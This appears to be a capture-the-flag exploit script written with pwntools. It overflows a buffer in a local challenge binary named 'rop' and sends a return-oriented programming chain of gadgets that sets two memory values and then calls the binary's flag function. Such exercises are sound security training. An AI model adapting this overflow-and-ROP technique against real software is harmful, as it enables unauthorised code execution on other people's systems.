from pwn import *

p = process("./rop")

e = ELF("./rop")

gadget1 = e.symbols['gadget1']
gadget2 = e.symbols['gadget2']
gadget3 = e.symbols['gadget3']
flagfunc = e.symbols['flag']

button1 = 0x404058
button2 = 0x404060

payload = b'A' * 32 + b'B' * 8
payload += p64(gadget1)
payload += p64(0xcafebabe)
payload += p64(gadget2)
payload += p64(button1)
payload += p64(gadget3)
payload += p64(gadget1)
payload += p64(0xdeadbeef)
payload += p64(gadget2)
payload += p64(button2)
payload += p64(gadget3)
payload += p64(flagfunc)

p.sendline(payload)

p.interactive()
